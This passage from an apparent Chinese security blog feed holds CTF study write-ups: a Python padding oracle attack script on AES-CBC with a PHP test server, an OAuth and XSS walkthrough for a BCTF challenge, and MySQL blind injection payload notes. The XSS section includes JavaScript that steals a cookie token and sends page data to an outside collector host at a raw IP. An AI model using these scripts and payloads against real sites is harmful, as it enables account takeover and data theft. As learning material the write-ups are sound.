= [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</div><div class="line">    mid_list = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</div><div class="line"></div><div class="line">    <span class="comment">#padding是每经过一轮都要变化的，因为每一轮都在爆破不同位</span></div><div class="line">    padding = <span class="number">0x01</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)[::<span class="number">-1</span>]:</div><div class="line">        find_tag = <span class="number">0</span></div><div class="line"></div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x100</span>):  <span class="comment">#0x00 ~ 0xff</span></div><div class="line"></div><div class="line">            <span class="comment">#至此层，是对iv[i]进行遍历，然后生成一个iv_str用于发送出去</span></div><div class="line">            iv[i] = j</div><div class="line">            iv_str = get_list_to_str_(iv)</div><div class="line"></div><div class="line">            <span class="comment">#如果没有这一步的话，在填充为0x10*16的时候，服务器解析正确的时候返回空字符串，还有可能进入异常分支，所以这一步是很重要的</span></div><div class="line">            <span class="keyword">if</span> (i == <span class="number">0</span>):</div><div class="line">                retu = inject(s, <span class="string">"1"</span>*<span class="number">32</span>, iv_str+cipher)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                retu = inject(s, iv_str, cipher)</div><div class="line"></div><div class="line">            <span class="comment">#基于服务器的返回情况进行判断，成立可以跳出此循环，进行下一位的爆破</span></div><div class="line">            <span class="keyword">if</span> (retu):</div><div class="line">                <span class="comment">#如果成立的话，进行以下操作</span></div><div class="line">                <span class="comment">#   基于iv对应位的值以及padding的值生成mid值</span></div><div class="line">                <span class="comment">#   更新padding的填充方式，也就是加一</span></div><div class="line">                <span class="comment">#   对应修改iv位上的值，由修改后的padding与mid值得到</span></div><div class="line">                mid = iv[i]^padding</div><div class="line">                <span class="keyword">print</span> hex_format(mid, <span class="number">2</span>),</div><div class="line">                mid_list[i] = mid</div><div class="line">                padding += <span class="number">1</span></div><div class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(i,<span class="number">16</span>):</div><div class="line">                    iv[k] = padding^mid_list[k]</div><div class="line">                find_tag = <span class="number">1</span></div><div class="line">                <span class="keyword">break</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> (find_tag == <span class="number">0</span>):</div><div class="line">            <span class="keyword">print</span></div><div class="line">            <span class="keyword">print</span> <span class="string">'在密文分组为&#123;&#125;的第&#123;&#125;个字节尝试了所有可能也没有发现匹配，请尝试分析'</span>.format(cipher, str(i))</div><div class="line">    mid_str = get_list_to_str_(mid_list)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> mid_str</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle_get_cipher</span><span class="params">(plain)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">    参数：明文字符串即可,\n \x0a是支持的，不支持0x0a  %0a,所以要注意转化</div><div class="line"></div><div class="line">    生成明文对应的密文的方式：</div><div class="line">        1、将明文转化为二进制格式并进行填充操作，并从最后一组开始</div><div class="line">        2、最后一组的操作为：传入任意密文得到mid值，并由明文得到iv值，作为下一组的密文</div><div class="line">        3、开始倒数第二组，将上一组的iv作为密文，得到mid值，然后由明文得到iv值，作为下一组的密文</div><div class="line">        4、。。。。</div><div class="line">        5、一直到最后一组，所解得的值作为IV值</div><div class="line">        6、将所有轮的结果连到一起构成cipher</div><div class="line"></div><div class="line">    返回：cipher</div><div class="line">    """</div><div class="line"></div><div class="line">    <span class="comment">#转化明文为二进制格式</span></div><div class="line">    plain = plain.encode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line">    <span class="comment">#对明文进行填充</span></div><div class="line">    <span class="keyword">if</span> (len(plain) % <span class="number">32</span> != <span class="number">0</span>):</div><div class="line">        temp = (<span class="number">32</span>-len(plain)%<span class="number">32</span>)/<span class="number">2</span></div><div class="line">        plain += hex_format(temp,<span class="number">2</span>)*temp</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        plain += <span class="string">'10'</span>*<span class="number">16</span></div><div class="line"></div><div class="line">    <span class="comment">#将明文进行分组</span></div><div class="line">    plain_list = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain))[::<span class="number">32</span>]:</div><div class="line">        plain_list.append(plain[i:i+<span class="number">32</span>])</div><div class="line">    <span class="keyword">print</span> <span class="string">"填充后的明文分组为:"</span> + str(plain_list)</div><div class="line"></div><div class="line">    <span class="comment">#循环求中间值,需要先指定最后一组密文,就由1组成吧</span></div><div class="line">    cipher_block = <span class="string">'1'</span>*<span class="number">32</span></div><div class="line">    cipher = <span class="string">""</span> + cipher_block</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain_list))[::<span class="number">-1</span>]:</div><div class="line">        <span class="comment">#求到对应mid块</span></div><div class="line">        mid_block = get_aes_mid(cipher_block)</div><div class="line">        <span class="comment">#由mid与当前的plain块得到cipehr块并加进去，同时结果作为下一组求mid的参数</span></div><div class="line">        cipher_block = hex_format(int(mid_block,<span class="number">16</span>) ^ int(plain_list[i],<span class="number">16</span>), <span class="number">32</span>)</div><div class="line">        <span class="keyword">print</span></div><div class="line">        <span class="keyword">print</span> <span class="string">'plain_list:'</span> + plain_list[i]</div><div class="line">        <span class="keyword">print</span> <span class="string">'mid_block:'</span>+mid_block</div><div class="line">        <span class="keyword">print</span> <span class="string">'iv:'</span>+cipher_block</div><div class="line">        cipher = cipher_block + cipher</div><div class="line"></div><div class="line">    <span class="keyword">return</span> cipher</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle_get_plain</span><span class="params">(cipher)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">    参数：IV+cipher</div><div class="line"></div><div class="line">    解密密文对应明文方法：</div><div class="line">        1、将IV与cipher连到一起，并分割成list的形式</div><div class="line">        2、从列表的第二组开始，操作为，传入对应的cipher块得到对应的mid值，并由index-1对应的块异或得到明文值</div><div class="line">        3、。。。。</div><div class="line">        4、一直到最后一组，所解得的值作为明文连起来构成明文</div><div class="line"></div><div class="line">    返回：明文对应的十六进制以及解出的明文</div><div class="line">    """</div><div class="line"></div><div class="line">    cipher_list = []</div><div class="line"></div><div class="line">    <span class="comment">#对cipher进行长度检查并切片处理，</span></div><div class="line">    <span class="keyword">if</span>(len(cipher)%<span class="number">32</span> != <span class="number">0</span>):</div><div class="line">        <span class="keyword">print</span> <span class="string">'长度不是32的倍数'</span></div><div class="line">        <span class="keyword">return</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher))[::<span class="number">32</span>]:</div><div class="line">        cipher_list.append(cipher[i:i+<span class="number">32</span>])</div><div class="line">    <span class="keyword">print</span> <span class="string">"待解密的两个密文分组: "</span> + str(cipher_list[<span class="number">1</span>:])</div><div class="line"></div><div class="line">    plain = <span class="string">""</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher_list))[<span class="number">1</span>:]:</div><div class="line">        mid_block = get_aes_mid(cipher_list[i])</div><div class="line">        plain_block = hex_format(int(mid_block,<span class="number">16</span>) ^ int(cipher_list[i<span class="number">-1</span>],<span class="number">16</span>), <span class="number">32</span>)</div><div class="line">        plain += plain_block</div><div class="line">        <span class="keyword">print</span></div><div class="line">        <span class="keyword">print</span> <span class="string">'plain_block:'</span>+ plain_block + <span class="string">' --&gt; '</span> + plain_block.decode(<span class="string">'hex'</span>)</div><div class="line">        <span class="keyword">print</span> <span class="string">'mid_block:'</span>+mid_block</div><div class="line">        <span class="keyword">print</span> <span class="string">'cipher_block:'</span>+cipher_list[i]</div><div class="line"></div><div class="line">    <span class="comment">#去除明文最后的填充位</span></div><div class="line">    plain_bin_len = len(plain)-int(plain[<span class="number">-2</span>:],<span class="number">16</span>)*<span class="number">2</span></div><div class="line">    plain = plain[:plain_bin_len]</div><div class="line"></div><div class="line">    <span class="keyword">return</span> plain, plain.decode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> padding_oracle_get_cipher(<span class="string">'x23'</span>)</div><div class="line"><span class="comment"># print padding_oracle_get_plain('3131313131313131313131313131313148345eb08722cda708607c96534117049976f1681a00afdaa18c7e42d181887c')</span></div></pre></td></tr></table></figure><h2 id="搭建测试环境"><a href="#搭建测试环境" class="headerlink" title="搭建测试环境"></a>搭建测试环境</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) &amp;&amp; $_GET[<span class="string">'id'</span>] != <span class="string">""</span>)&#123;</div><div class="line">    $iv = substr($_GET[<span class="string">'id'</span>], <span class="number">0</span>, <span class="number">32</span>);</div><div class="line">    $iv = pack(<span class="string">'H*'</span>, $iv);</div><div class="line">    $cipher = substr($_GET[<span class="string">'id'</span>], <span class="number">32</span>);</div><div class="line">    $cipher = pack(<span class="string">'H*'</span>,$cipher);</div><div class="line">  <span class="comment">//需要注意php里面加解密模块的参数格式： $cipher与$iv都是以字符串输入的，而不是十六进制形式的字符串，所以上面我需要将传入的参数进行十六进制解码变成相应的字符串</span></div><div class="line">    $retu = openssl_decrypt($cipher, <span class="string">'aes-128-cbc'</span>,</div><div class="line">        hash(<span class="string">'md5'</span>, <span class="string">'Yiruma'</span>, <span class="keyword">true</span>), OPENSSL_RAW_DATA, $iv);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($retu) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'1'</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'hacker?'</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><h2 id="一点疑惑"><a href="#一点疑惑" class="headerlink" title="一点疑惑"></a>一点疑惑</h2><p>如果仔细看了赵老师的博客后都知道我们每个字节的测试都是基于解到的plain是否满足最后为0x01  0x020x02 0x030x030x03这种形式，但是在我们测试每一个分组的第一个字节的时候会出现什么情况？？期望的填充位没有问题肯定是<code>&quot;0x10&quot;*16</code>，所以我们希望服务器在解到10101010101010101010101010101010的时候给我们回显，但是这时候服务器解密出来的<code>&quot;0x10&quot;*16</code>所对应的字符串是””<br>OK，那我们可以考虑下，如果服务端是这样写的呢？if($retu){echo ‘1’}else{echo ‘hacker?’},那么这个时候空字符串就会对应回显’hacker?’,这并不是我们想看到的，因为如果唯一能被aes正常解密的一次猜测都对应这样的回显的话，那对这个字节的256次尝试将不会看到一次对应为1的回显。也就是说最后一个字节将无法求得。<br>有没有大佬能给出解释呢，是需要在Padding Oracle Attack的代码上要有所改进吗？</p><p>在Ben师傅帮助下已经解决：<br>其实也蛮简单，在测试这一位的时候我们往服务器传送两个分组，这样一个分组全填充也就是填充为<code>&quot;0x10*16&quot;</code>的时候解密出来的字符串并不是””，因为还有前面一个分组，所以就不会出现上述的问题了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;代码是完成了，但还是有个小疑问（会在最后给出描述），问了好多师傅但都没回我，好尴尬-_-||&lt;br&gt;更新:在Ben师傅的帮助下问题已经解决，解决方案和问题描述放在最后，代码也已经更新请放心食用~~&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>OAuth授权流程学习以及Turning Self-XSS into Good-XSS</title>
    <link href="https://someonesometimes.github.io/2017/08/31/OAuth%E6%8E%88%E6%9D%83%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8ATurning-Self-XSS-into-Good-XSS/"/>
    <id>https://someonesometimes.github.io/2017/08/31/OAuth授权流程学习以及Turning-Self-XSS-into-Good-XSS/</id>
    <published>2017-08-31T07:17:26.000Z</published>
    <updated>2017-10-18T09:54:31.643Z</updated>
    
    <content type="html"><![CDATA[<p>说起来是因为对BCTF的Dairy题目重新复习才写了这篇笔记，原谅我当时没吃透这道题的原理，近日看Ven师傅的wp中提到了OAuth授权，才意识到出这道题目的用意。。。</p><a id="more"></a><h2 id="学习OAuth"><a href="#学习OAuth" class="headerlink" title="学习OAuth"></a>学习OAuth</h2><p>首先需要学习OAuth，这里推荐这篇文章———<a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="external">理解OAuth 2.0</a>，只看其中最常见的授权码模式就可以了，本题就用的这种模式。说白了就是平常我们上网站经常看到登陆的时候可以选择通过qq登陆，微信登陆，微博登陆啊这种登录模式，点击后我们在跳出来的页面上给出授权，就可以成功登陆网站了<br><img src="http://i.imgur.com/m2gvx3I.png" alt=""><br>我们可以举个例子来体验下阮老师文章里所说的过程，我是使用freebuf测试的</p><ol><li><p>freebuf将我们导向qq的认证服务器，同时附加上所需要的参数    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">https://graph.qq.com/oauth2.0/authorize</div><div class="line">?response_type=code   授权类型response_type=code表示是授权码模式的验证</div><div class="line">&amp;client_id=100578783  表明自己客户端的id</div><div class="line">&amp;redirect_uri=https://account.tophant.com/qq.html  指定重定向的url redirect_uri</div><div class="line">&amp;state=2d5c6bac1ec4c0be640766dacbd2127c   自己的状态码</div><div class="line">&amp;scope=get_user_info   客户端要的权限scope</div></pre></td></tr></table></figure></li><li><p>在我点击授权后，qq将我们重定向到freebuf所指定的redirect_uri，并携带有授权码code</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">https://account.tophant.com/qq.html</div><div class="line">?code=6DDBE8E30017C9C44C55F45B2A53A015   关键的授权码code</div><div class="line">&amp;state=875cf715b9163b0e73f6f6b88afb9475  状态码，非必要</div></pre></td></tr></table></figure></li><li><p>在第一条链接中我们可以看到freebuf申请的权限是get_user_info，那么之后freebuf就可以拿着code向qq获取我的用户信息来作为freebuf的登陆识别</p></li></ol><p>最后多嘴一句，这里要分清两种登陆状态，一种是qq的登陆状态，也就是资源提供者，另一种是freebuf的登陆状态，是通过访问qq认证之后拿到code码实现登陆的</p><h2 id="结合Diary题目学习Turning-Self-XSS-into-Good-XSS"><a href="#结合Diary题目学习Turning-Self-XSS-into-Good-XSS" class="headerlink" title="结合Diary题目学习Turning Self-XSS into Good-XSS"></a>结合Diary题目学习Turning Self-XSS into Good-XSS</h2><p><strong>题目有两个域</strong></p><ul><li><p>diary.bctf.xctf.org.cn</p></li><li><p>auth.bctf.xctf.org.cn</p></li></ul><p><strong>登陆机制介绍</strong><br>如果想登陆diary域的话，会被定向到auth域内，输入用户名密码实现登陆后，会发送链接到auth.bctf.xctf.org.cn/o/authorize/来获取code，auth域会给code并将用户定位到diary域来实现diary域的登陆，所以可以看到这里auth域扮演者类似qq的资源提供者的角色，而diary域扮演着类似freebuf的客户端的角色</p><p><strong>两个xss点介绍</strong><br>然后再看下xss点，我们可以给admin发送链接，通过这个url漏洞可以将admin定位到任意url点<code>http://diary.bctf.xctf.org.cn/static/%5c%5cxss平台/xss.html</code><br>另外一个xss点是在我们以自己的身份登陆的时候可以在diary域看到自己的留言，这块只能让admin以我们的身份登陆的时候才能看到并触发</p><p><strong>xss点过滤介绍</strong><br>第一个xss点因为是在我们自己的vps上触发，所以是没有任何过滤的<br>第二个xss点是在留言板上回显，通过filter.js对输出进行了一些编码，通过HTML实体编码或者<code>&lt;iframe srcdoc=&quot;&lt;img src=x onerror=&#39;alert(1);&#39;&gt;&quot;&gt;</code>都可以绕过</p><p><strong>我们的目的以及利用思路介绍</strong><br>要拿到flag需要让admin在<code>http://diary.bctf.xctf.org.cn/survey/</code>下提交表单，并携带自己cookie中的token才行，第一个xss点在自己的vps上是拿不到cookie的，所以我们只能着眼与第二个域内的xss点才能通过js代码拿admin的cookie中的信息，而第二个xss点需要在自己的账户才能触发，所以需要让admin先退出在diary的登陆，然后登陆我们自己的账户才能触发代码，这块代码需要将admin登陆回自己的账户，再拿取cookie中信息并进行表单提交，最后拿到flag。<br>整个流程中的两处logout以及login需要留意，因为涉及到OAuth的操作方式，这也是我们在下面具体操作过程中需要留意的</p><p><strong>具体操作过程</strong><br>首先通过第一个xss点让admin定位到我们自己的xss.html里面，这里面需要退出admin在diary内的登陆，然后登陆我们的账户<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"img-src http://diary.bctf.xctf.org.cn/"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://diary.bctf.xctf.org.cn/accounts/logout/"</span> <span class="attr">onerror</span>=<span class="string">"login();"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">    var login = function() &#123;</div><div class="line">        var loginImg = document.createElement('img');</div><div class="line">        loginImg.src = "http://diary.bctf.xctf.org.cn/accounts/login/";</div><div class="line">        loginImg.onerror = redir;</div><div class="line">    &#125;</div><div class="line">    var redir = function() &#123;</div><div class="line">        //这里code是登陆的时候抓包拦下来的</div><div class="line">        var code="d4SOl5u07GvJhsz5co1V084hGrQLoz";</div><div class="line">        var loginImg2 = document.createElement('img');</div><div class="line">        loginImg2.src = 'http://diary.bctf.xctf.org.cn/o/receive_authcode?state=preauth&amp;code='+code;</div><div class="line">        loginImg2.onerror = function() &#123;</div><div class="line">            window.location = 'http://diary.bctf.xctf.org.cn/diary/';</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p><p>留意登陆我们账户的过程，正常登陆过程是向auth域内的认证页面发送请求，验证auth域登陆状态后发送code回去，但这里我们auth域的登陆状态是admin的，所以这里我们直接跳过第一个url，直接向diary域发送由auth下发的代表我们自己账户的code，那code怎么来呢？通过burp抓包就可以了，注意burp中要把那个发送code的请求拦下来晾在那里不要发出去，这样我们就成功的让admin以我们自己的身份登陆了，之后将admin浏览器定位到第二个xss点</p><p>这里的我们我们要做的任务就是将admin重新登陆自己的账户，并POST表单来拿flag，这里怎么登陆呢，其实很简单，我们直接向auth域发送登陆请求就可以了，因为admin浏览器的auth域一直都在以admin的身份登陆着，所以下发的code就可以让admin登陆回自己的diary域。之后就是通过xhr提交表单请求，并发送页面反馈信息回自己的xss平台拿到flag<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">第二个xss点，跳转到post.js执行js代码</div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;script src='http://diary.bctf.xctf.org.cn/static/js/jquery.min.js'&gt;&lt;/script&gt;&lt;script src='http://104.160.43.154:8000/myjs/post.js'&gt;&lt;/script&gt;"</span>&gt;</span></div></pre></td></tr></table></figure></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">post.js</div><div class="line"><span class="keyword">var</span> loginIframe = <span class="built_in">window</span>.top.document.createElement(<span class="string">'iframe'</span>);</div><div class="line">loginIframe.setAttribute(<span class="string">'src'</span>, <span class="string">'http://104.160.43.154:8000/myjs/in_and_out.html'</span>);</div><div class="line"><span class="built_in">window</span>.top.document.body.appendChild(loginIframe);</div><div class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    $.post(<span class="string">"http://diary.bctf.xctf.org.cn/survey/"</span>,</div><div class="line">        &#123;</div><div class="line">            <span class="attr">rate</span>:<span class="string">'5'</span>,</div><div class="line">            <span class="attr">suggestion</span>:<span class="string">'123'</span>,</div><div class="line">            <span class="attr">csrfmiddlewaretoken</span>:<span class="built_in">document</span>.cookie.split(<span class="string">';'</span>)[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>]</div><div class="line">           &#125;,</div><div class="line">        <span class="function"><span class="keyword">function</span> (<span class="params">data</span>)</span>&#123;</div><div class="line">            $.get(<span class="string">"http://xss平台?a="</span>+<span class="built_in">escape</span>(data),functoon(data,status)&#123;&#125;);</div><div class="line">        &#125;</div><div class="line">    );</div><div class="line">&#125;, <span class="number">6000</span>);</div></pre></td></tr></table></figure><h2 id="一点感想"><a href="#一点感想" class="headerlink" title="一点感想"></a>一点感想</h2><p>xss题目一直是比赛中必出的一类题，玩法多样有趣，我从今年三月份开始打ctf并学习xss到现在，xss题目没做多少，也就是0ctf里那两道以及bctf这一道，还有看各路大佬打pwnhub后写的xss题目的wp，但笔记就已经做了万把字了，主要原因还是在于xss题目trick极多，比较难入手，（不过还是同意wupco师傅说的，自己菜才是原罪2333）。等到有一天觉得自己对xss了解的够多了，就把这一路的笔记发出来，毕竟相比sql注入啥的漏洞，xss的学习资源更少，逻辑也更绕，手法也更多样，哎算了，就我的xss水平还是先别立flag了，先踏实做吧。<br>对了，每次做xss题目，输入payload然后盯着自己的xss平台等访问请求的那种感觉真的是贼爽，如果真的接收到了发过来的访问就感觉和中了彩票一样高兴，我想这也是支持我去一点点的学习xss的主要原因吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;说起来是因为对BCTF的Dairy题目重新复习才写了这篇笔记，原谅我当时没吃透这道题的原理，近日看Ven师傅的wp中提到了OAuth授权，才意识到出这道题目的用意。。。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mysql注入学习（持续保持更新）</title>
    <link href="https://someonesometimes.github.io/2017/07/23/mysql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/"/>
    <id>https://someonesometimes.github.io/2017/07/23/mysql注入学习（持续更新中）/</id>
    <published>2017-07-23T05:53:32.000Z</published>
    <updated>2018-04-28T13:55:44.410Z</updated>
    
    <content type="html"><![CDATA[<p>目前排版还比较乱，常见的姿势基本已经整理的比较全了，还在不断学习中。。。</p><a id="more"></a><h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><h3 id="第一步：字符串截取函数"><a href="#第一步：字符串截取函数" class="headerlink" title="第一步：字符串截取函数"></a>第一步：字符串截取函数</h3><p><em>选取那个完全由过滤了什么符号决定，一般查看的有：函数名，逗号，空格</em><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">substring((<span class="keyword">select</span> xxx) <span class="keyword">from</span> <span class="number">-1</span>|<span class="number">-2</span>|<span class="number">-3.</span>.. <span class="keyword">for</span> <span class="number">1</span>)</div><div class="line"><span class="keyword">substr</span>((<span class="keyword">select</span> xxx) <span class="keyword">from</span> <span class="number">-1</span>|<span class="number">-2</span>|<span class="number">-3.</span>.. <span class="keyword">for</span> <span class="number">1</span>)</div><div class="line"><span class="keyword">mid</span>((<span class="keyword">select</span> xxx) <span class="keyword">from</span> <span class="number">-1</span>|<span class="number">-2</span>|<span class="number">-3.</span>.. <span class="keyword">for</span> <span class="number">1</span>)</div><div class="line">过滤少的时候可以使用((<span class="keyword">select</span> xxx),<span class="number">1</span>|<span class="number">2</span>|<span class="number">3.</span>..,<span class="number">1</span>)的原始形式</div><div class="line"></div><div class="line"><span class="keyword">left</span>((<span class="keyword">select</span> xxx),<span class="number">2</span>)</div><div class="line"><span class="keyword">right</span>((<span class="keyword">select</span> xxx),<span class="number">2</span>)</div><div class="line"><span class="keyword">right</span>(<span class="keyword">left</span>((<span class="keyword">select</span> xxx),<span class="number">1</span>|<span class="number">2</span>|<span class="number">3.</span>..),<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="keyword">select</span> <span class="keyword">count</span>(<span class="number">1</span>) <span class="keyword">from</span> flag <span class="keyword">where</span> <span class="built_in">binary</span>(flag)&lt;<span class="number">0</span>x&#123;&#125;</div><div class="line">不按位截取了,每次将数据与一个长的字符串做对比 <span class="keyword">select</span> <span class="keyword">count</span>(<span class="number">1</span>) <span class="keyword">from</span> flag <span class="keyword">where</span> <span class="built_in">binary</span>(flag)&lt;<span class="number">0</span>x&#123;&#125;</div><div class="line">这种payload用的函数更少，也更短，通过表的长度变化作为回显数据的多种情况，比较适用于<span class="keyword">id</span>这种情况里，<span class="keyword">id</span>=<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>分别对应不同的值，但是在<span class="keyword">where</span>条件是字符串中，我们需要的是<span class="number">0</span>，<span class="number">1</span>两种bool条件，所以可能适用性就不太强了</div></pre></td></tr></table></figure></p><h3 id="第二步：将截取到的字符串段进行比较得到另一个数据"><a href="#第二步：将截取到的字符串段进行比较得到另一个数据" class="headerlink" title="第二步：将截取到的字符串段进行比较得到另一个数据"></a>第二步：将截取到的字符串段进行比较得到另一个数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">substring [=|like] [''|0xxxx]本身的结果就已经是用0，1 表示了</div><div class="line">(if(substring [=|like] [''|0xxxx], 0,1))</div><div class="line">(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="keyword">substring</span> [=|<span class="keyword">like</span>] [<span class="string">''</span>|<span class="number">0</span>xxxx]) <span class="keyword">then</span> <span class="number">0</span> <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span>)</div><div class="line"></div><div class="line">使用<span class="built_in">binary</span>()来比较，来区分大小写</div></pre></td></tr></table></figure><h3 id="第三步：产生两种结果"><a href="#第三步：产生两种结果" class="headerlink" title="第三步：产生两种结果"></a>第三步：产生两种结果</h3><h4 id="基于bool的盲注"><a href="#基于bool的盲注" class="headerlink" title="基于bool的盲注"></a>基于bool的盲注</h4><p>判断结果的0或1或产生两种不同的回显结果，这就是bool型盲注思路<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">where user='' or [0|1] and ''=''  三者作为比较运算的条件</div><div class="line">where user='0'+[0|1]+'0'三者作为运算结果，如果为'0'将匹配所有字符串，如果为'1'则匹配不了字符串，能够省略and等运算符</div></pre></td></tr></table></figure></p><h4 id="基于time的盲注"><a href="#基于time的盲注" class="headerlink" title="基于time的盲注"></a>基于time的盲注</h4><p>如果满足条件就sleep上一段时间，如果没有就不sleep，然后通过计算处理时间来得到两种回显结果<br>一般insert语句这种不会有文字回显的采用基于time盲注的两种情况<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#需要注意一点的是，这里的重点不是让条件等式的结果为0或1，只要让等式中sleep的那一段运行就好</div><div class="line">where user='1' and [1,|sleep(5)]%23</div></pre></td></tr></table></figure></p><h4 id="基于报错的盲注"><a href="#基于报错的盲注" class="headerlink" title="基于报错的盲注"></a>基于报错的盲注</h4><p><strong>需要注意的一点是，既然数据库会报错回显，本质上和只有两种回显的情况是有不同的，在精心构造的语句+低版本的数据库中是可能直接拿到数据而不用盲注的，有关于报错的分类以及直接拿数据的方法我们在后面都会介绍到，这里只是盲注中对基于报错的使用</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#利用函数传入参数的格式错误报错</div><div class="line">select 1 from users where user='' or [0/1] and ST_LatFromGeoHash(version())%23;</div><div class="line">#利用exp函数的运算溢出可以造成报错，从710开始就会报错了，~0，，~1等等也都是可以的</div><div class="line">select 1 from users where user='' or [0/1] or exp(~0)</div><div class="line">#利用支持运算的最大值构造报错，这里的0就是按位取反得到的最大值，也就是18446744073709551615</div><div class="line">select 1 from users where user='' or [0/1] or ~0+1</div></pre></td></tr></table></figure><h3 id="盲注中可能用到的一些点"><a href="#盲注中可能用到的一些点" class="headerlink" 